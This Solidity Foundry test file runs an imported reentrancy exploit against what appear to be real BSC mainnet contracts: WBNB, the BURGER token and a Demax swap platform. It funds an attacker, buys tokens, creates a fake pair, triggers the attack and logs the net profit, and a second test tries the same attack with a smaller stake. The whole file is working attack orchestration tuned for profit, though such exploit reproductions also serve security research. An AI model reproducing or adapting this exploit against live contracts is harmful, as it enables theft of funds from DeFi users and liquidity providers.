// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest3 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    BurgerExploit exploit;
    address attacker;

    function test_optimized() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 3000 ether);
        vm.startPrank(attacker);
        exploit = new BurgerExploit();

        // Setup
        exploit.step1_setup{value: 2500 ether}();

        // Buy BURGER - spend most WBNB
        exploit.step2_buyBurger(2000 ether);
        uint256 burgerBal = IERC20(BURGER).balanceOf(address(exploit));
        emit log_named_uint("BURGER bought", burgerBal);

        // Put minimal BURGER in fake pair, keep maximum for inner swap
        // Only 1% for the pair, 99% for reentrancy
        uint256 burgerForPair = burgerBal / 100;
        exploit.step3_createPair(100 ether, burgerForPair);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));
        exploit.step4_attack(50 ether);
        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));

        emit log_named_uint("WBNB before", wbnbBefore);
        emit log_named_uint("WBNB after", wbnbAfter);
        emit log_named_uint("WBNB gained from attack", wbnbAfter - wbnbBefore);

        uint256 burgerRemaining = IERC20(BURGER).balanceOf(address(exploit));
        emit log_named_uint("BURGER remaining", burgerRemaining);

        // Convert remaining BURGER back to WBNB
        if (burgerRemaining > 1000) {
            // Need to re-approve for remaining BURGER
            address[] memory path = new address[](2);
            path[0] = BURGER;
            path[1] = WBNB;
            IERC20(BURGER).approve(PLATFORM, type(uint256).max);
            IDemaxPlatform(PLATFORM).swapExactTokensForTokens(
                burgerRemaining,
                0,
                path,
                address(exploit),
                block.timestamp + 3600
            );
        }

        uint256 finalWbnb = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("Final WBNB", finalWbnb);

        exploit.step5_unwrap();
        emit log_named_uint("Final BNB", attacker.balance);
        emit log_named_int("Net profit", int256(attacker.balance) - 3000 ether);

        vm.stopPrank();
    }

    function test_smallInvestment() public {
        // Try with smaller investment to see if net positive
        attacker = makeAddr("attacker");
        vm.deal(attacker, 500 ether);
        vm.startPrank(attacker);
        exploit = new BurgerExploit();

        exploit.step1_setup{value: 400 ether}();

        // Buy BURGER with just 100 WBNB
        exploit.step2_buyBurger(100 ether);
        uint256 burgerBal = IERC20(BURGER).balanceOf(address(exploit));
        emit log_named_uint("BURGER bought", burgerBal);

        // Minimal fake pair, max for inner swap
        uint256 burgerForPair = burgerBal / 100;
        exploit.step3_createPair(100 ether, burgerForPair);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));
        exploit.step4_attack(50 ether);
        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));

        emit log_named_uint("WBNB gained from attack", wbnbAfter - wbnbBefore);

        exploit.step5_unwrap();
        emit log_named_uint("Final BNB", attacker.balance);
        emit log_named_int("Net profit", int256(attacker.balance) - 500 ether);

        vm.stopPrank();
    }
}
